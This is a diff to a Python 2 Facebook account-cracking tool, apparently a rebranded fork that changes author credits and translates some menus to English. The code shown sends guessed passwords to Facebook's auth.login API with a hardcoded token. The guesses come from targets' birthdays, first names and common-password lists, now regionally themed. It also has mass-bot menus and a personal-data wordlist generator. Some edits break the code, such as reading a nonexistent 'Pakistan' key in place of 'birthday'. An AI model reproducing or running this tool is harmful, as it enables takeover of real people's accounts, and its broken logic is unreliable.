@@ -44,9 +44,9 @@ logo = """\033[1;97m█████████
 \033[1;97m█████████      \033[1;96m«°°°°°°°°°°✧°°°°°°°°°°»
 \033[1;97m ██ ██
 \033[1;97m╔════════════════════════════════════════╗
-\033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mThe Magizz \033[1;97m                 ║
-\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/TheMagizz\033[1;97m║
-\033[1;97m║\033[1;93m* \033[1;97mFB      \033[1;91m: \033[1;92m\033[4mhttps://fb.me/rizz.magizz\033[0m   \033[1;97m║
+\033[1;97m║\033[1;93m* \033[1;97mRecode  \033[1;91m: \033[1;96mIjaz Afridi\033[1;97m                 ║
+\033[1;97m║\033[1;93m* \033[1;97mGithub  \033[1;91m: \033[1;96mhttps://github.com/Mrbadmash\033[1;97m║
+\033[1;97m║\033[1;93m* \033[1;97mFB Page \033[1;91m: \033[1;92m\033[4m Mr_ijaz_official302\033[0m   \033[1;97m║
 \033[1;97m║\033[1;93m* \033[1;97mVersion \033[1;91m: \033[1;92m\033[4m1.1.0\033[0m                       \033[1;97m║
 \033[1;97m╚════════════════════════════════════════╝"""
 
@@ -112,7 +112,7 @@ def login():
 	except (KeyError,IOError):
 		os.system('reset')
 		print logo
-		print('\033[1;91m[☆] \033[1;92mLOGIN AKUN FACEBOOK \033[1;91m[☆]')
+		print('\033[1;91m[☆] \033[1;92mLOGIN FACEBOOK ID \033[1;91m[☆]')
 		id = raw_input('\033[1;91m[+] \033[1;36mID\033[1;97m|\033[1;96mEmail\033[1;97m \033[1;91m:\033[1;92m ')
 		pwd = getpass.getpass('\033[1;91m[+] \033[1;36mPassword \033[1;91m:\033[1;92m ')
 		tik()
@@ -257,7 +257,7 @@ def pilih():
 		os.remove('out')
 	elif zedd =="9":
 		os.system('rm -rf login.txt')
-		os.system('xdg-open https://www.facebook.com/rizz.magizz')
+		os.system('xdg-open https://www.youtube.com/channel/UCCyRQcvCFo1ZgH4NaJM-qNw')
 		keluar()
 	elif zedd =="0":
 		keluar()
@@ -1039,7 +1039,7 @@ def mini():
 								raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 								menu_hack()
 							else:
-								lahir = a['birthday']
+								lahir = a['Pakistan']
 								pz4 = lahir.replace('/', '')
 								data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 								y = json.load(data)
@@ -1060,7 +1060,7 @@ def mini():
 										raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 										menu_hack()
 									else:
-										lahirs = a['birthday']
+										lahirs = a['India']
 										gaz = lahirs.replace('/', '')
 										pz5 = a['first_name']+gaz
 										data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
@@ -1082,7 +1082,7 @@ def mini():
 												raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 												menu_hack()
 											else:
-												pz6 = "bintang123"
+												pz6 = "786786"
 												data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 												y = json.load(data)
 												if 'access_token' in y:
@@ -1102,7 +1102,7 @@ def mini():
 														raw_input("\n\033[1;91m[ \033[1;97mBack \033[1;91m]")
 														menu_hack()
 													else:
-														pz7 = "sayang123, sayang, bintang, bajingan, someone, anjing, pukimak, playboy, doraemon, bahagia"
+														pz7 = "karachi123, , pakistan786, india786, suleman, kashmir, hacker404, playboy, bangladesh123, prince"
 														data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(id)+"&locale=en_US&password="+(pz7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 														y = json.load(data)
 														if 'access_token' in y:
@@ -1368,7 +1368,7 @@ def pilih_super():
 									cekpoint.append(user+pass3)
 								else:
 									#Pass4
-									lahir = b['birthday']
+									lahir = b['Pakistan']
 									pass4 = lahir.replace('/', '')
 									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 									q = json.load(data)
@@ -1385,7 +1385,7 @@ def pilih_super():
 											cekpoint.append(user+pass4)
 										else:
 											#Pass5
-											pass5 = "sayang123","sayangku123"
+											pass5 = "Hackerboy","lofar123"
 											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 											q = json.load(data)
 											if 'access_token' in q:
@@ -1401,7 +1401,7 @@ def pilih_super():
 													cekpoint.append(user+pass5)
 												else:
 													#Pass6
-													pass6 = "bintang123","bintang12345"
+													pass6 = "India786","bangladesh786"
 													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
 													q = json.load(data)
 													if 'access_token' in q:
@@ -1856,8 +1856,8 @@ def menu_bot():
 	print logo
 	print "\033[1;97m║--\033[1;91m> \033[1;92m1.\033[1;97m Bot Reactions Target Post"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m2.\033[1;97m Bot Reactions Grup Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Komen Target Post"
-	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Komen Grup Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m3.\033[1;97m Bot Comment Target Post"
+	print "\033[1;97m║--\033[1;91m> \033[1;92m4.\033[1;97m Bot Comment Grup Post"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m5.\033[1;97m Mass delete Post"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m6.\033[1;97m Mass accept friend"
 	print "\033[1;97m║--\033[1;91m> \033[1;92m7.\033[1;97m Mass delete friend"
@@ -2336,20 +2336,20 @@ def wordlist():
 		print logo
 		print "\033[1;91m[?] \033[1;92mFill in the complete data of the target below"
 		print 42*"\033[1;97m═"
-		a = raw_input("\033[1;91m[+] \033[1;92mNama Depan \033[1;97m: ")
+		a = raw_input("\033[1;91m[+] \033[1;92mFirst Name \033[1;97m: ")
 		file = open(a+".txt", 'w')
-		b=raw_input("\033[1;91m[+] \033[1;92mNama Tengah \033[1;97m: ")
-		c=raw_input("\033[1;91m[+] \033[1;92mNama Belakang \033[1;97m: ")
-		d=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan \033[1;97m: ")
-		e=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		b=raw_input("\033[1;91m[+] \033[1;92m Middle Name \033[1;97m: ")
+		c=raw_input("\033[1;91m[+] \033[1;92mLast Name \033[1;97m: ")
+		d=raw_input("\033[1;91m[+] \033[1;92mNick Name \033[1;97m: ")
+		e=raw_input("\033[1;91m[+] \033[1;92mDate of Birth >\033[1;96mex: |DDMMYY| \033[1;97m: ")
 		f=e[0:2]
 		g=e[2:4]
 		h=e[4:]
 		print 42*"\033[1;97m═"
-		print("\033[1;91m[?] \033[1;93mKalo Jomblo SKIP aja :v")
-		i=raw_input("\033[1;91m[+] \033[1;92mNama Pacar \033[1;97m: ")
-		j=raw_input("\033[1;91m[+] \033[1;92mNama Panggilan Pacar \033[1;97m: ")
-		k=raw_input("\033[1;91m[+] \033[1;92mTanggal Lahir Pacar >\033[1;96mex: |DDMMYY| \033[1;97m: ")
+		print("\033[1;91m[?] \033[1;93mIf Single SKIP it :v")
+		i=raw_input("\033[1;91m[+] \033[1;92mBoyfriend's name \033[1;97m: ")
+		j=raw_input("\033[1;91m[+] \033[1;92mGirlfriend's nickname \033[1;97m: ")
+		k=raw_input("\033[1;91m[+] \033[1;92mBoyfriend's birthday >\033[1;96mex: |DDMMYY| \033[1;97m: ")
 		jalan('\033[1;91m[✺] \033[1;92mCreate \033[1;97m...')
 		l=k[0:2]
 		m=k[2:4]
